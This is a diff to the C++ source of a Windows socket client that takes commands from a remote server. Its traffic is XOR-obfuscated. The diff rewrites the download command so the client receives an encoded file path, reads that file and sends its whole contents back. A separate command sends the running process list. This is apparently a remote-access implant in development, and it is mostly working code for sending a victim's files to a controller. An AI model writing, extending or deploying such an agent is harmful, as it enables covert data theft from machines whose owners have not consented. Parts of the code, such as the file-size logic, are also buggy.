@@ -15,6 +15,7 @@ g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt
 #include <string>
 #include <iomanip>
 #include <algorithm>
+#include <filesystem>
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
@@ -337,11 +338,41 @@ int handle_upload(int sock, const char* filename) {
 
 
 // Client handles download from server.
-void handle_download(int sock, const char* filename) {
-	ifstream file(filename, ios::in | ios::binary);
+/*
+void handle_download(SOCKET sock, const char* filepath) {
+	printf("In handle_download\n");
+
+	std::string filepathStr(filepath, strlen(filepath));
+	printf("filepathStr: %s\n", filepathStr);
+	
+	std::ifstream file(filepathStr, std::ios::binary); //Open the file
 	if (!file.is_open()) {
-		printf("error creating file: %s\n", filename); // print error message
+		// download error handling
+		std::ostringstream oss;
+    	oss << "error creating file: " << filepathStr << "\n";
+    	std::string errMsg = oss.str();
+		sendMsg(errMsg, sock);
 	}
+
+	std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+
+	sendMsg(fileContents, sock);
+
+	
+	// get file size
+	std::streamsize fileSize = file.tellg();
+	file.seekg(0, std::ios::beg);
+	std::string filesize = std::to_string(fileSize);
+
+	char* buffer = (char*)malloc(fileSize);
+	if (!file.read(buffer, fileSize)) {
+		file.close();
+		free(buffer);
+		return;
+	}
+
+	
+
 
 	char buf[DEFAULT_BUFLEN];
 	while (!file.eof()) {
@@ -355,7 +386,7 @@ void handle_download(int sock, const char* filename) {
 		}
 	}
 
-	/*int filesize = 0;
+	int filesize = 0;
 	int total_read = 0;
 	DWORD current_read_bytes = 0;
 	DWORD read_bytes = 0;
@@ -387,9 +418,9 @@ void handle_download(int sock, const char* filename) {
 		xor_func(buf, read_bytes);
 		send(sock, buf, read_bytes, 0);
 	}
-	CloseHandle(fhandle);*/
+	CloseHandle(fhandle);
 }
-
+*/
 // checks if user input is correct
 // returns an int specific to case number in main()
 int parseCmd(char cmd[]) {
@@ -485,14 +516,15 @@ SOCKET getConnected() {
 void sendMsg(std::string data, SOCKET sock) {
 	char* d = const_cast<char*>(data.c_str()); // cast getData as char* so it can be xor'd and used with strlen()
 	size_t msgLenCount = strlen(d);
-	printf("systeminfo length: %d\n", msgLenCount); //debug
-	
-	int msgLen = static_cast<int>(msgLenCount); // get length of message         
+	printf("Data length: %d\n", msgLenCount); //debug
+
+	int msgLen = static_cast<int>(msgLenCount); // get length of message
 	stringstream ss; // init stringstream to hold msgLen
 	ss << std::hex << msgLen; //send message length in hex
 	string msgLenStr = ss.str(); // typecast stringstream to c++ string
 	char* msgLenChar = const_cast<char*>(msgLenStr.c_str()); // typecast c++ string into char*
-	printf("message length content: %s\n", msgLenChar); // show the message length message
+
+	printf("message length content(hex): 0x%s\n", msgLenChar); // show the message length message
 	xor_func(msgLenChar); // xor the message length before sending
 	char lenBuf[9]; // 9 spaces for hex length int, means message length can total up to 4 gigabytes
 	strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
@@ -517,7 +549,6 @@ void sendMsg(std::string data, SOCKET sock) {
 }
 
 int main() {
-	string filepath;				// var for filepath
 	int cmd;						// var for command from server
 	int command_packet_len;			// var for length of command packet
 	char buf[DEFAULT_BUFLEN];		// var for character buffer to send data to the server
@@ -531,10 +562,9 @@ int main() {
 		std::string data;					// hold info in string form
 		std::wstring data2;					// hold info in wstring form
 		int offset = 0;						// hold offset for parsing data
-		int getcmd;							// hold result of command from server
 		memset(buf, 0, DEFAULT_BUFLEN);		// clear buffer
 		memset(recvbuf, 0, DEFAULT_BUFLEN); // clear rcv buffer
-		getcmd = recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
+		recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
 		/*
 		recv(sock, (char *)&command_packet_len, 4, 0);
 
@@ -577,14 +607,27 @@ int main() {
 		case 1: {
 			printf("Download\n"); // debug
 			// get filepath from server
-			int bytes_received = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
-			if (bytes_received < 0) {
-				printf("Failed to receive filepath\n"); // debug
-			}
-			filepath = recvbuf;
-			// recvbuf[bytes_received] = '\0';
+			memset(recvbuf, 0, DEFAULT_BUFLEN);
+			recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
+			char* filepath; // var for filepath
+			
+			filepath = xor_func(recvbuf);
+			printf("filepath: %s\n", filepath);
 
-			handle_download(sock, filepath.c_str()); // fix
+			// handle the download
+			std::string filepathStr(filepath, strlen(filepath));
+			std::ifstream file(filepathStr, std::ios::binary); //Open the file
+			if (!file.is_open()) {
+				// download error handling
+				std::string errMsg = "1";
+				sendMsg(errMsg, sock);
+			}
+
+			std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+
+			sendMsg(fileContents, sock);
+
+			// handle_download(sock, filepath.c_str()); 
 			// read command_packet_length bytes into filename
 			// open filename, send chunks back out socket
 		} break;
@@ -592,7 +635,6 @@ int main() {
 		//new case for getRunningProcess;
 		case 2: {
             printf("processes\n");
-            printf("debugggggg\n");
 			data = GetProcessList();
 			sendMsg(data, sock);
         } break;
